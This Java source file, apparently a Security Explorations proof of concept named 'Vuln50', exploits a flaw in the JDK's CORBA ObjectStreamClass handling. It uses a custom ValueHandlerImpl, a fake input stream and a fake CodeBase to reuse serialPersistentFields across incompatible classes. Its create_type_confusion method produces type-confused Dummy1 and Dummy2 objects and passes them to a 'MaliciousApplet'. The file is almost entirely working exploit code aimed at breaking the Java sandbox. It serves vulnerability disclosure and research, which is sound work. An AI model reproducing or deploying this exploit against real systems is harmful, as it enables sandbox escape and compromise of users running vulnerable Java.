

/* com.sun.corba.se.impl.io.ObjectStreamClass                                 */
/* the possibility to use same serialPersistentFields value for classes with  */
/* incompatible fields layout                                                 */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

import java.io.*;
import com.sun.corba.se.impl.io.*;
import org.omg.CORBA.portable.*;
import com.sun.org.omg.CORBA.ValueDefPackage.*;
import com.sun.org.omg.CORBA.*;
import org.omg.CORBA.Request;
import org.omg.CORBA.Context;
import org.omg.CORBA.NVList;
import org.omg.CORBA.NamedValue;
import org.omg.CORBA.ExceptionList;
import org.omg.CORBA.ContextList;
import org.omg.CORBA.Policy;
import org.omg.CORBA.DomainManager;
import org.omg.CORBA.SetOverrideType;
import org.omg.CORBA.ValueMember;

public class Vuln50 {
  public static java.io.ObjectStreamField common_fields[];

  static {
   try {
    common_fields=new java.io.ObjectStreamField[2];
    common_fields[0]=new java.io.ObjectStreamField("h",Class.forName("Helper"));
    common_fields[1]=new java.io.ObjectStreamField("sh",Class.forName("SpoofedHelper"));
   } catch(Throwable t) {
    t.printStackTrace();
   }
  }

  public static class MyValueHandlerImpl extends ValueHandlerImpl {
    public MyValueHandlerImpl(boolean isInputStream) {
     super(isInputStream);
    }

    public boolean useFullValueDescription(Class clazz, String repositoryID) throws IOException {
     return true;
    }

    public String getRMIRepositoryID(Class clazz) {
     return null;
    } 

    public String getClassName(String s) {
     return "Dummy1";
    }
  }

  public static class MyInputStream extends org.omg.CORBA_2_3.portable.InputStream {
    public Serializable read_value() {
     return null;
    }

    public Serializable read_value(Class class1) {
     String name=class1.getName();

     Serializable res=null;

     System.out.println("read_value "+name);

     if (name.equals("Helper")) {
      res=new Helper();
     } else
     
     if (name.equals("SpoofedHelper")) {
      res=new SpoofedHelper();
     }

     return res;
    }

    public Serializable read_value(BoxedValueHelper boxedvaluehelper) {
     return null;
    }

    public Serializable read_value(String s) {
     return null;
    }

    public Serializable read_value(Serializable serializable) {
     return null;
    }

    public Object read_abstract_interface() {
     return null;
    }

    public Object read_abstract_interface(Class class1) {
     return null;
    }

    public boolean read_boolean() {
     return false;
    }

    public char read_char() {
     return (char)0;
    }

    public char read_wchar() {
     return (char)0;
    }

    public byte read_octet() {
     return (byte)0;
    }

    public short read_short() {
     return (short)0;
    }

    public short read_ushort() {
     return (short)0;
    }

    public int read_long() {
     return (int)0;
    }

    public int read_ulong() {
     return (int)0;
    }

    public long read_longlong() {
     return (long)0;
    }

    public long read_ulonglong() {
     return (long)0;
    }

    public float read_float() {
     return (float)0;
    }

    public double read_double() {
     return (double)0;
    }

    public String read_string() {
     return "";
    }

    public String read_wstring() {
     return "";
    }

    public void read_boolean_array(boolean aflag[], int i, int j) {
    }

    public void read_char_array(char ac[], int i, int j) {
    }

    public void read_wchar_array(char ac[], int i, int j) {
    }

    public void read_octet_array(byte abyte0[], int i, int j) {
    }

    public void read_short_array(short aword0[], int i, int j) {
    }

    public void read_ushort_array(short aword0[], int i, int j) {
    }

    public void read_long_array(int ai[], int i, int j) {
    }

    public void read_ulong_array(int ai[], int i, int j) {
    }

    public void read_longlong_array(long al[], int i, int j) {
    }

    public void read_ulonglong_array(long al[], int i, int j) {
    }

    public void read_float_array(float af[], int i, int j) {
    }

    public void read_double_array(double ad[], int i, int j) {
    }

    public org.omg.CORBA.Object read_Object() {
     return null;
    }

    public org.omg.CORBA.TypeCode read_TypeCode() {
     return null;
    }

    public org.omg.CORBA.Any read_any() {
     return null;
    }
  }

  public static class MyCodeBase implements com.sun.org.omg.SendingContext.CodeBase {
    public Repository get_ir() {
     return null;
    }

    public String implementation(String s) {
     return null;
    }

    public String[] implementations(String as[]) {
     return null;
    }

    public FullValueDescription meta(String s) {

     ValueMember vmtab[]=new ValueMember[0];

     return new FullValueDescription("name","id",false,false,"defined_in","version",null,null,vmtab,null,null,null,false,null,null);
    }

    public FullValueDescription[] metas(String as[]) {
     return null;
    }

    public String[] bases(String s) {
     return null;
    }

    public boolean _is_a(String s) {
     return false;
    }

    public boolean _is_equivalent(org.omg.CORBA.Object obj) {
     return false;
    }

    public boolean _non_existent() {
     return false;
    }

    public int _hash(int i) {
     return 0;
    }

    public org.omg.CORBA.Object _duplicate() {
     return null;
    }

    public void _release() {
    }

    public org.omg.CORBA.Object _get_interface_def() {
     return null;
    }

    public Request _request(String s) {
     return null;
    }

    public Request _create_request(Context context, String s, NVList nvlist, NamedValue namedvalue) {
     return null;
    }

    public Request _create_request(Context context, String s, NVList nvlist, NamedValue namedvalue, ExceptionList exceptionlist, ContextList contextlist) {
     return null;
    }

    public Policy _get_policy(int i) {
     return null;
    }

    public DomainManager[] _get_domain_managers() {
     return null;
    }

    public org.omg.CORBA.Object _set_policy_override(Policy apolicy[], SetOverrideType setoverridetype) {
     return null;
    }

  }

 public static void create_type_confusion() {
  try {
   MyValueHandlerImpl mvhi=new MyValueHandlerImpl(true);

   MyInputStream mis=new MyInputStream();

   MyCodeBase mcb=new MyCodeBase();

   Class c=Class.forName("Dummy1");

   Dummy1 d1=(Dummy1)mvhi.readValue(mis,0,c,"se",mcb);

   c=Class.forName("Dummy2");

   Dummy2 d2=(Dummy2)mvhi.readValue(mis,0,c,"se",mcb);

   MaliciousApplet.d2=d2;
  } catch (Throwable e) {
   e.printStackTrace();
  }

 }
}
